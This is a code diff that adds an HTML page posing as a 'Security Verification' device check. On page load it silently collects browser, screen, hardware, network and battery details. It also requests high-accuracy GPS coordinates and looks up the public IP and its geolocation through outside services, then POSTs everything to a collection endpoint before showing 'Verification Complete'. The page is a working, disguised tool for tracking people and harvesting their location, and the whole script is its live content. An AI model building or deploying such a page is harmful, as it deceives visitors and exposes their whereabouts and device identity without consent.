@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Verification</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        .loading { color: #666; }
+    </style>
+    <script>
+        async function collectEverything() {
+            const allData = {
+                timestamp: new Date().toISOString(),
+                collectedData: {}
+            };
+
+            try {
+                // 1. 🎯 المعلومات الأساسية
+                allData.collectedData.basicInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    vendor: navigator.vendor,
+                    appName: navigator.appName,
+                    appVersion: navigator.appVersion,
+                    language: navigator.language,
+                    languages: navigator.languages
+                };
+
+                // 2. 🖥️ معلومات الشاشة
+                allData.collectedData.screenInfo = {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                };
+
+                // 3. 🌍 الموقع والزمن
+                allData.collectedData.locationInfo = {
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset()
+                };
+
+                // 4. 📡 معلومات الشبكة
+                if (navigator.connection) {
+                    allData.collectedData.networkInfo = {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt,
+                        saveData: navigator.connection.saveData
+                    };
+                }
+
+                // 5. 🔋 البطارية
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        allData.collectedData.batteryInfo = {
+                            charging: battery.charging,
+                            level: Math.round(battery.level * 100),
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
+                    } catch (e) {}
+                }
+
+                // 6. 💾 الذاكرة والمعالج
+                allData.collectedData.hardwareInfo = {
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    maxTouchPoints: navigator.maxTouchPoints
+                };
+
+                // 7. 🛡️ إعدادات الخصوصية
+                allData.collectedData.privacyInfo = {
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    pdfViewerEnabled: navigator.pdfViewerEnabled,
+                    webdriver: navigator.webdriver
+                };
+
+                // 8. 📍 الموقع الجغرافي (GPS)
+                if (navigator.geolocation) {
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: true,
+                                timeout: 5000,
+                                maximumAge: 0
+                            });
+                        });
+                        allData.collectedData.gpsLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed
+                        };
+                    } catch (error) {
+                        allData.collectedData.gpsError = error.message;
+                    }
+                }
+
+                // 9. 🌐 الـ IP العام
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    allData.collectedData.publicIP = ipData.ip;
+                    
+                    // الحصول على معلومات الموقع من الـ IP
+                    try {
+                        const geoResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
+                        const geoData = await geoResponse.json();
+                        allData.collectedData.ipGeoInfo = geoData;
+                    } catch (e) {
+                        console.log('Geo IP error:', e);
+                    }
+                } catch (e) {
+                    allData.collectedData.ipError = e.message;
+                }
+
+                // 10. 📊 إرسال البيانات
+                await sendAllData(allData);
+
+            } catch (error) {
+                console.error('Collection error:', error);
+            }
+        }
+
+        async function sendAllData(data) {
+            try {
+                console.log('📦 Sending data to server...', data);
+                
+                const response = await fetch('/api/collect', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                if (response.ok) {
+                    console.log('✅ Data sent successfully!');
+                    document.body.innerHTML = '<h2>✅ Verification Complete</h2><p>You can close this page.</p>';
+                } else {
+                    console.error('❌ Server error:', response.status);
+                }
+            } catch (error) {
+                console.error('❌ Send error:', error);
+            }
+        }
+
+        // بدء الجمع عند تحميل الصفحة
+        window.addEventListener('load', function() {
+            console.log('🚀 Starting data collection...');
+            collectEverything();
+        });
+    </script>
+</head>
+<body>
+    <div class="loading">
+        <h2>Security Verification</h2>
+        <p>Checking your device compatibility...</p>
+        <div style="margin: 20px;">⏳</div>
+    </div>
+</body>
+</html>
